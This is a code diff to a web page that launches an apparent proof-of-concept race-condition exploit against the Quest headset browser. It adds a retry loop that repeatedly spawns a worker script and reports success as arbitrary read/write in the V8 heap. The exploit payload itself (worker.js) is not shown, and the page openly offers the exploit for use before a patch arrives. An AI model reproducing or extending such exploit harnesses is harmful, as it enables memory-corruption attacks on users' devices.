@@ -20,6 +20,7 @@ hoverSound.preload = 'auto';
 pressSound.preload = 'auto';
 let audioUnlocked = false;
 let fuckingAround = false;
+let fails = 0;
 document.addEventListener('pointerdown', () => {
     if (audioUnlocked)
     {
@@ -41,11 +42,58 @@ button.addEventListener('mousedown', () => {
     pressSound.play();
 });
 button.addEventListener('click', () => {
-    if (!fuckingAround)
+    if (fuckingAround)
     {
-        fuckingAround = true;
-        alert('Exploit starting now, sit tight.\n\nYour headset may encounter issues during this.\nIf so, please reboot your headset and try again.\n\nIn no way is this root, this is a PoC for exploits\nwithin the Quest Browser and is still limited in terms of power.\n\nThis is an adaptation from a PoC for CVE-2026-95380 \n\nTHIS WILL LIKELY BE PATCHED SOON\nDO WITH THAT AS YOU WILL');
+        return;
     }
+    fuckingAround = true;
+    alert('Press OK to start the exploit.\n\nYour headset may encounter issues during this.\nIf so, please reboot your headset and try again.\n\nIn no way is this root, this is demo PoC for exploits\nwithin the Quest Browser and is still limited in terms of power.\n\nTHIS WILL LIKELY BE PATCHED SOON\nDO WITH THAT AS YOU WILL');
+    //Launch the race exploit
+    const start = performance.now();
+    let tries = 0;
+    let worker;
+    
+    log('starting exploit...');
+    try {
+        const testWorker = new Worker('worker.js');
+        log('worker created ok');
+    } catch(e) {
+        log('worker error: ' + e);
+        return;
+    }
+
+    function run() {
+        if (fails >= 15)
+        {
+            log(`error - exploit likely patched`);
+            return;
+        }
+        tries++;
+        if (worker) worker.terminate();
+        worker = new Worker('worker.js');
+        worker.onmessage = ({data}) => {
+            if (data === 'READY') worker.postMessage('arm');
+            else if (data === 'ARMED') worker.postMessage('check');
+            else if (data === 'MISS') {
+                log('miss — retrying...');
+                fails++
+                run();
+            }
+            else if (data.startsWith('PASS')) {
+                worker.terminate();
+                const elapsed = ((performance.now() - start) / 1000).toFixed(2);
+                fails = 0;
+                log(`pass - arb r/w in v8 heap`);
+                log(`result: ${data}`);
+                log(`try: ${tries} | time: ${elapsed}s`);
+            }
+        };
+        worker.onerror = ({message}) => {
+            log(`err: ${message}`);
+        };
+    }
+    
+    run();
 });
 </script>
 
